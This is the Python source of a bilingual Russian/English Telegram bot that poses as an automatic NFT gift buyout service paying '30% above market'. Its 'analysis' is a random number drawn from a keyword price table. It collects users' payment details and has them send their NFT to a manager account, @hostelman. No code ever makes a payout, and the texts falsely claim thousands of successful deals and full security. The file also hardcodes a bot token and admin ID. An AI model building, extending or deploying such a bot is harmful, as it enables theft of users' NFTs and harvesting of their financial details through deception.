import logging
import re
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ==================== CONFIG ====================
BOT_TOKEN = "8729370914:AAFe5bDtSnGxuUbu-yUZ7dhNoRT-boOHkik"
ADMIN_ID = 174415647

# ==================== STATES ====================
WAITING_NFT_LINK = 1
WAITING_PAYMENT_METHOD = 2
WAITING_REQUISITES = 3

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("nft_bot")

# ==================== ВАЛЮТЫ ПОД КАЖДЫЙ МЕТОД ====================
PAYMENT_CURRENCY = [
    ("USDT", "USDT"),   # 0  CryptoBot
    ("USDT", "USDT"),   # 1  TRC20
    ("TON",  "TON"),    # 2  Tonkeeper
    ("UAH",  "грн"),    # 3  Украина
    ("RUB",  "руб"),    # 4  Россия
    ("USD",  "$"),      # 5  США
    ("BYN",  "руб"),    # 6  Беларусь
    ("KZT",  "тг"),     # 7  Казахстан
    ("UZS",  "сум"),    # 8  Узбекистан
    ("TRY",  "₺"),      # 9  Турция
    ("AZN",  "₼"),      # 10 Азербайджан
]

# Курсы к USD (февраль 2026)
RATES = {
    "USDT": 1,
    "TON":  0.19,   # ~5.3 TON за $1
    "UAH":  41,
    "RUB":  90,
    "USD":  1,
    "BYN":  3.2,
    "KZT":  480,
    "UZS":  12800,
    "TRY":  32,
    "AZN":  1.7,
}

# ==================== NFT ЦЕНЫ (реальный рынок февраль 2026, floor price в USD) ====================
# Цены основаны на актуальных данных с Getgems / Tonnel / Fragment
# Диапазон: от минимального floor до среднего listing price
# Наше предложение = рынок × 1.30 (+30%)
NFT_PRICES_USD = {
    # Топовые коллекции (голубые фишки)
    "plushpepe":   (6500,  8500),   # Plush Pepe — floor ~$6914, топ $295k
    "plush":       (6500,  8500),   # алиас
    "pepe":        (6500,  8500),   # алиас

    # Средний сегмент (популярные коллекции)
    "dragon":      (180,   420),    # Dragon — активно торгуется
    "crystal":     (95,    250),    # Crystal Ball / Gem Signet
    "gem":         (95,    250),    # алиас
    "diamond":     (140,   380),    # Diamond Ring и подобные
    "heart":       (55,    140),    # Heart-themed gifts
    "star":        (45,    120),    # Star-themed
    "loot":        (60,    160),    # Loot Bag
    "gold":        (320,   850),    # Gold-серия (Gold Pepe ~$6500 TON)

    # Базовый сегмент (массовые коллекции)
    "cat":         (12,    35),     # Cat-themed
    "bear":        (10,    28),     # Bear-themed
    "dog":         (8,     22),     # Dog-themed
    "duck":        (6,     18),     # Duck-themed
    "bunny":       (8,     20),     # Jelly Bunny и подобные
    "jelly":       (8,     20),     # алиас
    "santa":       (5,     15),     # Santa Hat
    "cake":        (4,     12),     # Homemade Cake
    "wine":        (4,     12),     # Spiced Wine
    "hat":         (5,     14),     # Hat-themed
    "gift":        (5,     16),     # Gift-themed
}

def estimate_price_usd(nft_name):
    """Оцениваем NFT по названию. Ищем совпадение по ключевым словам."""
    name_lower = nft_name.lower().replace("-", "").replace("_", "")
    for key, (lo, hi) in NFT_PRICES_USD.items():
        if key in name_lower:
            base = round(random.uniform(lo, hi), 2)
            our_price = round(base * 1.30, 2)
            return base, our_price
    # Неизвестный NFT — базовый диапазон масс-маркета
    base = round(random.uniform(5, 30), 2)
    our_price = round(base * 1.30, 2)
    return base, our_price

def convert_price(usd_amount, currency_code):
    rate = RATES.get(currency_code, 1)
    if currency_code in ("USDT", "USD"):
        return round(usd_amount, 2)
    if currency_code == "TON":
        return round(usd_amount / rate, 2)
    return round(usd_amount * rate, 0)

def format_price(amount, pay_idx):
    currency_code, currency_label = PAYMENT_CURRENCY[pay_idx]
    converted = convert_price(amount, currency_code)
    if currency_code in ("USDT", "USD"):
        return "$" + str(converted) + " " + currency_code
    elif currency_code == "TON":
        return str(converted) + " TON"
    else:
        return str(int(converted)) + " " + currency_label

def is_nft_link(text):
    return bool(re.match(r'https?://t\.me/nft/[\w\-]+', text.strip()))

def get_lang(context):
    return context.user_data.get("lang", "ru")

# ==================== TEXTS ====================

WELCOME_RU = (
    "🎁 *Добро пожаловать в Автоматическую Скупку NFT-подарков в Telegram!*\n\n"
    "Мы — профессиональный сервис по выкупу NFT-подарков выше рыночной стоимости.\n"
    "Наш бот автоматически оценивает ваш NFT по характеристикам: модель, фон, узор — "
    "и предлагает вам цену *на 30% выше рынка* 📈\n\n"
    "Тысячи успешных сделок. Быстрые выплаты. Полная безопасность.\n\n"
    "Выберите действие ниже 👇"
)

WELCOME_EN = (
    "🎁 *Welcome to the Automatic NFT Gift Buyout service in Telegram!*\n\n"
    "We are a professional service that purchases NFT gifts above market value.\n"
    "Our bot automatically evaluates your NFT by characteristics: model, background, pattern — "
    "and offers you a price *30% above the market* 📈\n\n"
    "Thousands of successful deals. Fast payouts. Full security.\n\n"
    "Choose an action below 👇"
)

HOW_DEAL_RU = (
    "🤝 *Как проводится сделка?*\n\n"
    "1. Вы присылаете ссылку на NFT-подарок\n"
    "2. Бот считает рыночную цену по параметрам: модель, фон, узор\n"
    "3. Вы выбираете способ оплаты\n"
    "4. Бот озвучивает свою сумму в вашей валюте\n\n"
    "_Пример:_ Я предлагаю вам за ваш NFT `https://t.me/nft/PlushPepe-2133` — *520 грн*\n"
    "Если согласны — нажмите *Да*, если нет — *Нет*\n\n"
    "5. При согласии — отправьте NFT менеджеру @hostelman\n"
    "6. Менеджер проверяет подарок и переводит оплату на ваши реквизиты\n\n"
    "⚡ Среднее время сделки: 5–15 минут"
)

HOW_DEAL_EN = (
    "🤝 *How is the deal conducted?*\n\n"
    "1. You send the NFT gift link\n"
    "2. The bot calculates market price by: model, background, pattern\n"
    "3. You choose a payment method\n"
    "4. The bot announces its offer in your currency\n\n"
    "_Example:_ I offer you for your NFT `https://t.me/nft/PlushPepe-2133` — *$8,983 USDT*\n"
    "If you agree — press *Yes*, if not — *No*\n\n"
    "5. If agreed — send the NFT to @hostelman\n"
    "6. The manager verifies the gift and transfers payment to your details\n\n"
    "⚡ Average deal time: 5–15 minutes"
)

SELL_ASK_LINK_RU = (
    "🔗 *Отправьте ссылку на ваш NFT-подарок*\n\n"
    "Формат: `https://t.me/nft/НазваниеНФТ-Номер`\n\n"
    "⚠️ Принимаются только NFT-подарки Telegram. "
    "Убедитесь что ссылка ведёт именно на NFT, а не на что-то другое."
)

SELL_ASK_LINK_EN = (
    "🔗 *Send the link to your NFT gift*\n\n"
    "Format: `https://t.me/nft/NFTName-Number`\n\n"
    "⚠️ Only Telegram NFT gifts are accepted. "
    "Make sure the link leads to an NFT, not something else."
)

PAYMENT_METHODS_RU = [
    "💎 CryptoBot (USDT)",
    "🔷 TRC20 (USDT)",
    "💎 Tonkeeper (TON)",
    "🇺🇦 Карта — Украина (UAH)",
    "🇷🇺 Карта — Россия (RUB)",
    "🇺🇸 Карта — США (USD)",
    "🇧🇾 Карта — Беларусь (BYN)",
    "🇰🇿 Карта — Казахстан (KZT)",
    "🇺🇿 Карта — Узбекистан (UZS)",
    "🇹🇷 Карта — Турция (TRY)",
    "🇦🇿 Карта — Азербайджан (AZN)",
]

PAYMENT_METHODS_EN = [
    "💎 CryptoBot (USDT)",
    "🔷 TRC20 (USDT)",
    "💎 Tonkeeper (TON)",
    "🇺🇦 Card — Ukraine (UAH)",
    "🇷🇺 Card — Russia (RUB)",
    "🇺🇸 Card — USA (USD)",
    "🇧🇾 Card — Belarus (BYN)",
    "🇰🇿 Card — Kazakhstan (KZT)",
    "🇺🇿 Card — Uzbekistan (UZS)",
    "🇹🇷 Card — Turkey (TRY)",
    "🇦🇿 Card — Azerbaijan (AZN)",
]

# ==================== KEYBOARDS ====================

def lang_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"),
    ]])

def main_menu_keyboard(lang):
    if lang == "ru":
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Продать NFT", callback_data="sell")],
            [InlineKeyboardButton("⚙️ Как проводится сделка?", callback_data="how_deal")],
            [InlineKeyboardButton("🆘 Поддержка", callback_data="support")],
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Sell NFT", callback_data="sell")],
            [InlineKeyboardButton("⚙️ How is the deal conducted?", callback_data="how_deal")],
            [InlineKeyboardButton("🆘 Support", callback_data="support")],
        ])

def payment_keyboard(lang):
    methods = PAYMENT_METHODS_RU if lang == "ru" else PAYMENT_METHODS_EN
    buttons = []
    for i, method in enumerate(methods):
        buttons.append([InlineKeyboardButton(method, callback_data="pay_" + str(i))])
    buttons.append([InlineKeyboardButton(
        "◀️ Назад" if lang == "ru" else "◀️ Back", callback_data="back_main"
    )])
    return InlineKeyboardMarkup(buttons)

def confirm_keyboard(lang):
    yes = "✅ Да, согласен" if lang == "ru" else "✅ Yes, I agree"
    no = "❌ Нет" if lang == "ru" else "❌ No"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(yes, callback_data="confirm_yes")],
        [InlineKeyboardButton(no, callback_data="confirm_no")],
    ])

def back_keyboard(lang):
    return InlineKeyboardMarkup([[
        InlineKeyboardButton(
            "◀️ Главное меню" if lang == "ru" else "◀️ Main menu",
            callback_data="back_main"
        )
    ]])

def admin_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🖼 Изменить баннер", callback_data="admin_banner")],
        [InlineKeyboardButton("💬 Все сделки", callback_data="admin_deals")],
        [InlineKeyboardButton("🚫 Заблокировать юзера", callback_data="admin_ban")],
    ])

# ==================== HELPER ====================

async def safe_edit(query, text, keyboard):
    try:
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=keyboard)
    except Exception:
        try:
            await query.edit_message_caption(caption=text, parse_mode="Markdown", reply_markup=keyboard)
        except Exception as e:
            logger.error("safe_edit failed: " + str(e))

# ==================== HANDLERS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text(
        "🌍 Выберите язык / Choose your language:",
        reply_markup=lang_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    lang = get_lang(context)

    if data == "lang_ru":
        context.user_data["lang"] = "ru"
        await safe_edit(query, WELCOME_RU, main_menu_keyboard("ru"))
        return

    if data == "lang_en":
        context.user_data["lang"] = "en"
        await safe_edit(query, WELCOME_EN, main_menu_keyboard("en"))
        return

    if data == "back_main":
        text = WELCOME_RU if lang == "ru" else WELCOME_EN
        await safe_edit(query, text, main_menu_keyboard(lang))
        context.user_data.pop("state", None)
        return

    if data == "how_deal":
        text = HOW_DEAL_RU if lang == "ru" else HOW_DEAL_EN
        await safe_edit(query, text, back_keyboard(lang))
        return

    if data == "support":
        if lang == "ru":
            text = "🆘 *Поддержка*\n\nПо всем вопросам обращайтесь к менеджеру: @hostelman\n\nМы работаем 24/7 и ответим вам в течение нескольких минут!"
        else:
            text = "🆘 *Support*\n\nFor all questions, contact the manager: @hostelman\n\nWe work 24/7 and will reply within minutes!"
        await safe_edit(query, text, back_keyboard(lang))
        return

    if data == "sell":
        context.user_data["state"] = WAITING_NFT_LINK
        text = SELL_ASK_LINK_RU if lang == "ru" else SELL_ASK_LINK_EN
        await safe_edit(query, text, back_keyboard(lang))
        return

    if data.startswith("pay_"):
        idx = int(data.split("_")[1])
        methods = PAYMENT_METHODS_RU if lang == "ru" else PAYMENT_METHODS_EN
        method = methods[idx]
        context.user_data["payment"] = method
        context.user_data["pay_idx"] = idx
        context.user_data["state"] = WAITING_REQUISITES

        nft_link = context.user_data.get("nft_link", "https://t.me/nft/PlushPepe-2133")
        base_usd = context.user_data.get("base_price", 5)
        our_usd = context.user_data.get("our_price", 6.5)

        price_str = format_price(our_usd, idx)
        market_str = format_price(base_usd, idx)

        if lang == "ru":
            text = (
                "💳 *Способ оплаты:* " + method + "\n\n"
                "📎 *Ваш NFT:* `" + nft_link + "`\n"
                "🏷 Рыночная стоимость: ~" + market_str + "\n"
                "💰 *Наше предложение: " + price_str + " (+30%)*\n\n"
                "📝 Введите ваши реквизиты для получения оплаты:"
            )
        else:
            text = (
                "💳 *Payment method:* " + method + "\n\n"
                "📎 *Your NFT:* `" + nft_link + "`\n"
                "🏷 Market value: ~" + market_str + "\n"
                "💰 *Our offer: " + price_str + " (+30%)*\n\n"
                "📝 Enter your payment details:"
            )
        await safe_edit(query, text, back_keyboard(lang))
        return

    if data == "confirm_yes":
        nft_link = context.user_data.get("nft_link", "")
        our_usd = context.user_data.get("our_price", 0)
        pay_idx = context.user_data.get("pay_idx", 0)
        price_str = format_price(our_usd, pay_idx)
        payment = context.user_data.get("payment", "")

        if lang == "ru":
            text = (
                "✅ *Отлично! Сделка принята.*\n\n"
                "Теперь вам нужно отправить ваш NFT менеджеру @hostelman\n\n"
                "📎 NFT: `" + nft_link + "`\n"
                "💵 Сумма выплаты: *" + price_str + "*\n"
                "💳 Способ оплаты: " + payment + "\n\n"
                "После получения NFT менеджер переведёт вам оплату в течение 5–15 минут.\n\n"
                "⚠️ Важно: передавайте NFT ТОЛЬКО через @hostelman. "
                "Мы не несём ответственности за сделки вне официального канала."
            )
        else:
            text = (
                "✅ *Great! Deal accepted.*\n\n"
                "Now you need to send your NFT to the manager @hostelman\n\n"
                "📎 NFT: `" + nft_link + "`\n"
                "💵 Payout amount: *" + price_str + "*\n"
                "💳 Payment method: " + payment + "\n\n"
                "After receiving the NFT, the manager will transfer payment within 5–15 minutes.\n\n"
                "⚠️ Important: transfer the NFT ONLY via @hostelman. "
                "We are not responsible for deals outside the official channel."
            )
        await safe_edit(query, text, back_keyboard(lang))
        context.user_data["state"] = None

        user = query.from_user
        admin_text = (
            "🔔 *Новая сделка!*\n"
            "👤 Пользователь: @" + str(user.username or user.id) + " (" + str(user.id) + ")\n"
            "📎 NFT: " + nft_link + "\n"
            "💵 Сумма: " + price_str + "\n"
            "💳 Метод: " + payment
        )
        try:
            await context.bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown")
        except Exception as e:
            logger.error("Admin notify failed: " + str(e))
        return

    if data == "confirm_no":
        if lang == "ru":
            text = "❌ Вы отказались от сделки. Если передумаете — мы всегда готовы!\n\nВозвращайтесь в главное меню 👇"
        else:
            text = "❌ You declined the deal. If you change your mind — we're always ready!\n\nReturn to the main menu 👇"
        await safe_edit(query, text, back_keyboard(lang))
        context.user_data["state"] = None
        return

    # ==================== ADMIN PANEL ====================
    if data == "admin_stats":
        await safe_edit(
            query,
            "📊 *Статистика бота*\n\n"
            "👥 Пользователей: —\n"
            "💰 Сделок: —\n"
            "📈 Объём выплат: —\n\n"
            "_Подключите БД для реальной статистики_",
            admin_keyboard()
        )
        return

    if data == "admin_broadcast":
        await safe_edit(
            query,
            "📢 *Рассылка*\n\nДля рассылки подключите базу данных и сохраняйте user\\_id пользователей.",
            admin_keyboard()
        )
        return

    if data == "admin_banner":
        await safe_edit(
            query,
            "🖼 *Изменение баннера*\n\nОтправьте новое фото боту. (Требует реализации хранилища)",
            admin_keyboard()
        )
        return

    if data == "admin_deals":
        await safe_edit(
            query,
            "💬 *Все сделки*\n\nПодключите базу данных для просмотра истории сделок.",
            admin_keyboard()
        )
        return

    if data == "admin_ban":
        await safe_edit(
            query,
            "🚫 *Блокировка*\n\nВведите /ban USER\\_ID для блокировки пользователя.",
            admin_keyboard()
        )
        return

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state")
    lang = get_lang(context)
    text = update.message.text.strip()

    if state == WAITING_NFT_LINK:
        if not is_nft_link(text):
            if lang == "ru":
                err = "⚠️ *Ошибка!* Это не похоже на ссылку NFT-подарка.\n\nПожалуйста, отправьте корректную ссылку:\n`https://t.me/nft/НазваниеНФТ-Номер`"
            else:
                err = "⚠️ *Error!* This doesn't look like an NFT gift link.\n\nPlease send a valid link:\n`https://t.me/nft/NFTName-Number`"
            await update.message.reply_text(err, parse_mode="Markdown")
            return

        context.user_data["nft_link"] = text
        nft_name = text.split("/nft/")[-1].split("-")[0]
        base_usd, our_usd = estimate_price_usd(nft_name)
        context.user_data["base_price"] = base_usd
        context.user_data["our_price"] = our_usd
        context.user_data["state"] = WAITING_PAYMENT_METHOD

        if lang == "ru":
            msg = (
                "🔍 *Анализ NFT завершён!*\n\n"
                "📎 NFT: `" + text + "`\n"
                "🏷 Рыночная стоимость: ~$" + str(base_usd) + " USDT\n"
                "💰 *Наше предложение: $" + str(our_usd) + " USDT (+30%)*\n\n"
                "Выберите способ получения оплаты — сумма будет пересчитана в вашу валюту 👇"
            )
        else:
            msg = (
                "🔍 *NFT Analysis complete!*\n\n"
                "📎 NFT: `" + text + "`\n"
                "🏷 Market value: ~$" + str(base_usd) + " USDT\n"
                "💰 *Our offer: $" + str(our_usd) + " USDT (+30%)*\n\n"
                "Choose your payment method — the amount will be converted to your currency 👇"
            )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=payment_keyboard(lang))
        return

    if state == WAITING_REQUISITES:
        context.user_data["requisites"] = text
        nft_link = context.user_data.get("nft_link", "")
        our_usd = context.user_data.get("our_price", 0)
        base_usd = context.user_data.get("base_price", 0)
        pay_idx = context.user_data.get("pay_idx", 0)
        payment = context.user_data.get("payment", "")
        context.user_data["state"] = None

        price_str = format_price(our_usd, pay_idx)
        market_str = format_price(base_usd, pay_idx)

        if lang == "ru":
            msg = (
                "📋 *Итог сделки:*\n\n"
                "📎 NFT: `" + nft_link + "`\n"
                "💳 Способ оплаты: " + payment + "\n"
                "🏷 Рынок: ~" + market_str + "\n"
                "💵 Сумма: *" + price_str + "*\n"
                "📝 Реквизиты: `" + text + "`\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "💬 Я предлагаю вам за ваш NFT `" + nft_link + "` сумму *" + price_str + "*\n\n"
                "Если согласны — нажмите *Да*, если нет — *Нет* 👇"
            )
        else:
            msg = (
                "📋 *Deal summary:*\n\n"
                "📎 NFT: `" + nft_link + "`\n"
                "💳 Payment method: " + payment + "\n"
                "🏷 Market: ~" + market_str + "\n"
                "💵 Amount: *" + price_str + "*\n"
                "📝 Details: `" + text + "`\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "💬 I offer you for your NFT `" + nft_link + "` the sum of *" + price_str + "*\n\n"
                "If you agree — press *Yes*, if not — *No* 👇"
            )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=confirm_keyboard(lang))
        return

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Доступ запрещён.")
        return

    caption = (
        "🛡 *ADMIN PANEL*\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 NFT Auto-Buyout Bot\n"
        "👥 Управление пользователями\n"
        "💰 Контроль сделок\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Выберите действие:"
    )
    banner_url = "https://telegra.ph/file/562db3a3a06a4c4a35b71.jpg"
    try:
        await update.message.reply_photo(
            photo=banner_url,
            caption=caption,
            parse_mode="Markdown",
            reply_markup=admin_keyboard()
        )
    except Exception:
        await update.message.reply_text(caption, parse_mode="Markdown", reply_markup=admin_keyboard())

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    print("Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
